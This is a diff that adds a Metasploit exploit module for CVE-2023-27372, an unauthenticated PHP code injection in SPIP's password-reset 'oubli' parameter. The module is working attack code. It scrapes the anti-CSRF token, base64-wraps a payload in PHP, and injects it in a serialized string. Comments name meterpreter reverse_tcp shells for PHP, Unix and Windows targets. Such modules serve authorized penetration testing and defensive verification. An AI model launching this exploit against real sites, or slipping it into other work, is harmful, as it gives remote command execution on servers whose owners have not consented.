@@ -1,0 +1,148 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Payload::Php
+  include Msf::Exploit::Remote::HttpClient
+  prepend Msf::Exploit::Remote::AutoCheck
+  include Msf::Exploit::Remote::HTTP::Spip
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SPIP form PHP Injection',
+        'Description' => %q{
+          This module exploits a PHP code injection in SPIP. The vulnerability exists in the
+          oubli parameter and allows an unauthenticated user to execute arbitrary commands
+          with web user privileges. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. Vulnerable versions
+          are <3.2.18, <4.0.10, <4.1.18 and <4.2.1.
+        },
+        'Author' => [
+          'coiffeur',         # Initial discovery
+          'Laluka',           # PoC
+          'Julien Voisin',    # MSF module
+          'Valentin Lobstein' # Added Windows compatibility and code rewrite
+        ],
+        'License' => MSF_LICENSE,
+        'References' => [
+          [ 'URL', 'https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-2-1-SPIP-4-1-8-SPIP-4-0-10-et.html' ],
+          [ 'URL', 'https://therealcoiffeur.com/c11010' ],
+          [ 'CVE', '2023-27372' ],
+        ],
+        'Privileged' => false,
+        'Platform' => %w[php unix linux win],
+        'Arch' => [ARCH_PHP, ARCH_CMD],
+        'Targets' => [
+          [
+            'PHP In-Memory',
+            {
+              'Platform' => 'php',
+              'Arch' => ARCH_PHP
+              # tested with php/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Unix/Linux Command Shell',
+            {
+              'Platform' => ['unix', 'linux'],
+              'Arch' => ARCH_CMD
+              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
+            }
+          ],
+          [
+            'Windows Command Shell',
+            {
+              'Platform' => 'win',
+              'Arch' => ARCH_CMD
+              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
+            }
+          ]
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [REPEATABLE_SESSION],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
+        'DefaultTarget' => 0,
+        'DisclosureDate' => '2023-02-27'
+      )
+    )
+  end
+
+  def check
+    rversion = spip_version || spip_plugin_version('spip')
+    return Exploit::CheckCode::Unknown('Unable to determine the version of SPIP') unless rversion
+
+    print_status("SPIP Version detected: #{rversion}")
+
+    vulnerable_ranges = [
+      { start: Rex::Version.new('4.2.0'), end: Rex::Version.new('4.2.1') },
+      { start: Rex::Version.new('4.1.0'), end: Rex::Version.new('4.1.18') },
+      { start: Rex::Version.new('4.0.0'), end: Rex::Version.new('4.0.10') },
+      { start: Rex::Version.new('3.2.0'), end: Rex::Version.new('3.2.18') }
+    ]
+
+    vulnerable_ranges.each do |range|
+      if rversion.between?(range[:start], range[:end])
+        return Exploit::CheckCode::Appears("The detected SPIP version (#{rversion}) is vulnerable.")
+      end
+    end
+
+    return Exploit::CheckCode::Safe("The detected SPIP version (#{rversion}) is not vulnerable.")
+  end
+
+  def send_payload(cmd, args = {})
+    send_request_cgi(
+      {
+        'uri' => args['uri'],
+        'method' => 'POST',
+        'vars_post' => {
+          'page' => 'spip_pass',
+          'lang' => 'fr',
+          'formulaire_action' => 'oubli',
+          'formulaire_action_args' => args['csrf'],
+          'oubli' => cmd
+        }
+      }
+    )
+  end
+
+  def php_exec_cmd(encoded_payload)
+    vars = Rex::RandomIdentifier::Generator.new
+    dis = '$' + vars[:dis]
+    encoded_clean_payload = Rex::Text.encode_base64(encoded_payload)
+    shell = <<-END_OF_PHP_CODE
+        #{php_preamble(disabled_varname: dis)}
+        $c = base64_decode("#{encoded_clean_payload}");
+        #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return shell
+  end
+
+  def exploit
+    uri = normalize_uri(target_uri.path, 'spip.php?page=spip_pass&lang=fr')
+    res = send_request_cgi({ 'uri' => uri })
+
+    fail_with(Msf::Exploit::Failure::Unreachable, "The request to uri: #{uri} did not respond") unless res
+    fail_with(Msf::Exploit::Failure::UnexpectedReply, "Got an http code that isn't 200: #{res.code}, when sending a request to uri: #{uri}") unless res&.code == 200
+
+    csrf = ''
+    unless (node = res.get_html_document.xpath('//form//input[@name="formulaire_action_args"]')).empty?
+      csrf = node.first['value']
+    end
+
+    print_status("Got anti-csrf token: #{csrf}")
+    print_status("#{rhost}:#{rport} - Attempting to exploit...")
+
+    phped_payload = target['Arch'] == ARCH_PHP ? payload.encoded : php_exec_cmd(payload.encoded)
+    final_payload = "<?php #{phped_payload} ?>"
+    oubli = "s:#{final_payload.length}:\"#{final_payload}\";"
+
+    send_payload(oubli, { 'uri' => uri, 'csrf' => csrf })
+  end
+end
